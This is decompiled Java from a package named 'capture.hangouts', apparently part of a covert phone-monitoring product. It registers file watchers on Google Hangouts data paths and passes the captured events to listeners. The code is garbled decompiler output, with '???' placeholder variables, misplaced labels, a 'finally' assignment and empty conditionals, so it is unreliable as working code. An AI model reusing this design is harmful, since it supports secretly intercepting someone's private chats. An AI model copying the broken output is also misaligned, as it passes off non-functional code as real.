package com.vvt.capture.hangouts.a;

import com.vvt.base.capture.h;
import com.vvt.io.m;
import com.vvt.n.a.b.b;
import java.io.File;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class c
  implements m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static c c;
  private List d;
  private HashSet e;
  private com.vvt.capture.hangouts.b.a f;
  private String g = null;
  private com.vvt.capture.hangouts.b.a.a h;
  
  private c()
  {
    Object localObject = new com/vvt/capture/hangouts/a/d;
    ((d)localObject).<init>(this);
    this.h = ((com.vvt.capture.hangouts.b.a.a)localObject);
    localObject = new java/util/HashSet;
    ((HashSet)localObject).<init>();
    this.e = ((HashSet)localObject);
  }
  
  public static c a()
  {
    synchronized (c.class)
    {
      c localc = c;
      if (localc == null)
      {
        localc = new com/vvt/capture/hangouts/a/c;
        localc.<init>();
        c = localc;
      }
      localc = c;
      return localc;
    }
  }
  
  public void a(h paramh)
  {
    int i = 0;
    Object localObject1 = null;
    int j = a;
    if (j != 0) {}
    synchronized (this.e)
    {
      Object localObject5 = this.e;
      boolean bool2 = ((HashSet)localObject5).contains(paramh);
      if (!bool2)
      {
        localObject5 = this.e;
        ((HashSet)localObject5).add(paramh);
      }
      ??? = this.d;
      if (??? != null) {
        break label284;
      }
      ??? = new java/util/ArrayList;
      ((ArrayList)???).<init>();
      this.d = ((List)???);
      localObject5 = b.a();
      int m = localObject5.length;
      j = 0;
      ??? = null;
      if (j < m)
      {
        Object localObject6 = localObject5[j];
        Object localObject7 = new java/io/File;
        ((File)localObject7).<init>((String)localObject6);
        boolean bool3 = ((File)localObject7).exists();
        if (bool3)
        {
          bool3 = a;
          if (bool3) {}
          localObject7 = new com/vvt/capture/hangouts/b/a;
          int n = 258;
          ((com.vvt.capture.hangouts.b.a)localObject7).<init>((String)localObject6, n);
          this.f = ((com.vvt.capture.hangouts.b.a)localObject7);
          localObject6 = this.f;
          localObject7 = this.h;
          ((com.vvt.capture.hangouts.b.a)localObject6).a((com.vvt.capture.hangouts.b.a.a)localObject7);
          localObject6 = this.d;
          localObject7 = this.f;
          ((List)localObject6).add(localObject7);
        }
        j += 1;
      }
    }
    int k = 0;
    ??? = null;
    for (;;)
    {
      Object localObject3 = this.d;
      i = ((List)localObject3).size();
      if (k >= i) {
        break;
      }
      localObject3 = (com.vvt.capture.hangouts.b.a)this.d.get(k);
      ((com.vvt.capture.hangouts.b.a)localObject3).a();
      i = k + 1;
      k = i;
    }
    label284:
    boolean bool1 = a;
    if (bool1) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    try
    {
      Object localObject1 = this.f;
      if (localObject1 != null)
      {
        bool = a;
        if (bool) {}
        localObject1 = this.f;
        ((com.vvt.capture.hangouts.b.a)localObject1).b();
      }
      synchronized (this.e)
      {
        localObject1 = this.e;
        Iterator localIterator = ((HashSet)localObject1).iterator();
        bool = localIterator.hasNext();
        if (!bool) {
          break label120;
        }
        localObject1 = localIterator.next();
        localObject1 = (h)localObject1;
        ((h)localObject1).a(paramString);
      }
      localObject3 = null;
    }
    catch (Exception localException)
    {
      bool = b;
      if (!bool) {}
    }
    label120:
    for (;;)
    {
      Object localObject3;
      this.f = null;
      bool = a;
      if (bool) {}
      return;
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    synchronized (this.e)
    {
      Object localObject1 = this.e;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      bool = localIterator.hasNext();
      if (bool)
      {
        localObject1 = localIterator.next();
        localObject1 = (h)localObject1;
        ((h)localObject1).a(paramString1, paramString2);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(h paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1;
    int k;
    boolean bool2;
    synchronized (this.e)
    {
      localObject1 = this.e;
      bool1 = ((HashSet)localObject1).contains(paramh);
      if (bool1)
      {
        localObject1 = this.e;
        ((HashSet)localObject1).remove(paramh);
      }
      localObject1 = this.e;
      int i = ((HashSet)localObject1).size();
      k = a;
      if ((k == 0) || (i == 0))
      {
        bool2 = a;
        if (!bool2) {}
      }
    }
    for (;;)
    {
      try
      {
        localObject1 = this.d;
        if (localObject1 == null)
        {
          return;
          localObject2 = finally;
          throw ((Throwable)localObject2);
        }
        bool2 = false;
        Object localObject3 = null;
        k = 0;
        ??? = null;
        localObject3 = this.d;
        int j = ((List)localObject3).size();
        if (k < j)
        {
          localObject3 = this.d;
          localObject3 = ((List)localObject3).get(k);
          localObject3 = (com.vvt.capture.hangouts.b.a)localObject3;
          ((com.vvt.capture.hangouts.b.a)localObject3).b();
          j = k + 1;
          k = j;
          continue;
        }
        localObject3 = this.d;
        ((List)localObject3).clear();
        j = 0;
        localObject3 = null;
        this.d = null;
        localObject3 = this.f;
        if (localObject3 != null)
        {
          localObject3 = this.f;
          ((com.vvt.capture.hangouts.b.a)localObject3).b();
          j = 0;
          localObject3 = null;
          this.f = null;
        }
      }
      catch (Exception localException)
      {
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        continue;
      }
      this.f = null;
      bool3 = a;
      if (!bool3) {}
    }
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
  }
  
  public void c(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */